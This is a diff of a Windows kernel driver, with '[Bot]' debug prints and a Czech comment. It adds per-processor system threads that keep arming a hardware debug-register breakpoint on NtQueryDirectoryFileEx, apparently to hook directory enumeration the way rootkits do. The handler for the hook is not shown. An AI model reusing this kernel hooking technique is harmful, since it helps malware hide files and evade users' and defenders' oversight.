@@ -15,16 +15,30 @@ __declspec(noinline) BOOLEAN fun(int n, int m) {
 	return r >= 65;
 }
 
-ULONG_PTR setupDr(ULONG_PTR arg) {
-	uint64_t dr7;
+__declspec(noinline) void thread(PVOID param) {
+	LARGE_INTEGER delay;
+	delay.QuadPart = -(10000000 * 60);
+	while (1) {
+		DbgPrintEx(0, 0, "[Bot] Thread %p %p\n", __readdr(0), __readdr(7));
+		KeDelayExecutionThread(KernelMode, FALSE, &delay);
+	}
+}
 
-	__writedr(0, arg);
+__declspec(noinline) void setDr(PVOID param) {
+	uint64_t dr0, dr7;
+	LARGE_INTEGER delay;
+	delay.QuadPart = -1;
+
+	dr0 = (uint64_t)NtQueryDirectoryFileEx;
 	dr7 = __readdr(7);
 	dr7 |= 0x1 << 1;
 	dr7 &= ~(0xf << 16);
-	__writedr(7, dr7);
 
-	return 0;
+	while (1) {
+		__writedr(0, dr0);
+		__writedr(7, dr7);
+		KeDelayExecutionThread(UserMode, TRUE, &delay);
+	}
 }
 
 extern uint32_t drHit;
@@ -40,6 +54,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 	UNICODE_STRING us;
 	PFILE_OBJECT ob;
 	PSECTION_OBJECT_POINTERS secObPtr;
+	ULONG i, n;
 
 	rand_state_t state;
 	hde64s hs;
@@ -64,8 +79,14 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 	tramp += 8;
 	
 
-	KeIpiGenericCall(setupDr, (uint64_t)NtQueryDirectoryFileEx);
+	//KeIpiGenericCall(setupDr, (uint64_t)NtQueryDirectoryFileEx);
 	//__debugbreak();
+
+	n = KeQueryMaximumProcessorCount();
+	for (i = 0; i < n; ++i) {
+		PsCreateSystemThread(&han, 0, NULL, NULL, NULL, setDr, NULL);
+		ZwClose(han);
+	}
 
 	DbgPrintEx(0, 0, "[Bot] %wZ\n", *RegistryPath);
 
@@ -101,6 +122,11 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 
 	ExFreePool(us.Buffer);
 
+	status = PsCreateSystemThread(&han, 0, NULL, NULL, NULL, thread, NULL);
+	DbgPrintEx(0, 0, "[Bot] Thread %x\n", status);
+
+	//vybral jsem max
+	DbgPrintEx(0, 0, "[Bot] Active: %u Max: %u\n", KeQueryActiveProcessorCount(NULL), KeQueryMaximumProcessorCount());
 	DbgPrintEx(0, 0, "[Bot] %p %p\n", __readdr(0), __readdr(7));
 	DbgPrintEx(0, 0, "[Bot] %u\n", fun(4, 5));
 	DbgPrintEx(0, 0, "[Bot] Hit %u\n", drHit);
